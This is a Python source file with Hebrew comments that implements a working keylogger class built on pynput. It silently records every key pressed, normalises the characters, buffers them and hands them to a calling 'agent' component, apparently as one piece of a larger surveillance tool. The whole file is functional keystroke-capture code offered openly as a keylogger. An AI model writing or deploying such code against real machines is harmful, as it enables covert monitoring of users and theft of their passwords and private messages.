from pynput.keyboard import Listener
from interface_agent import IKeyLogger

class ListenerKeyboard(IKeyLogger):
    # בעת יצירת מופע יוצר אוטומטית מערך ריק, מאזין למקלדת, ובודק לפעולות בפונקציה get_logged_keys()
    def __init__(self):
        self.list = []
        self.listener = Listener(on_press=self.on_press)
        self.send = False

    # מתחיל להאזין להקשות במקלדת
    def start_logging(self) -> None:
        self.listener.start()

    # עוצר את האזנה למקשים במקלדת
    def stop_logging(self) -> None:
        self.listener.stop()

    # מחזיר מערך עם את כל ההקשות במקלדת שנשמרו
    def get_logged_keys(self) -> list[str]:
        the_final_list = self.list
        self.send = True
        return the_final_list

    # לוקח את התו שהוקש במקלדת, מסדר את התו שיהיה מסודר ושולח לפונקציה ששאחראית להכניס למערך
    def on_press(self,key):
        key = str(key).replace("'", "")
        if key == '""':
            key = "'"
        if key == "Key.space":
            key = " "
        if not key.isalpha() and not key.isnumeric() and not key == " ":
            key = ' {0} '.format(key)
        self.add_to_list(key)
        return key

    # לוקח את התו שהוקש ומכניס למערך, ובודק אם הופעלה הפונקציה get_logged_keys(), אם כן - מתאפס המערך
    def add_to_list(self,key) -> None:
        if self.send:
            self.list = []
            self.send = False
        self.list.append(key)
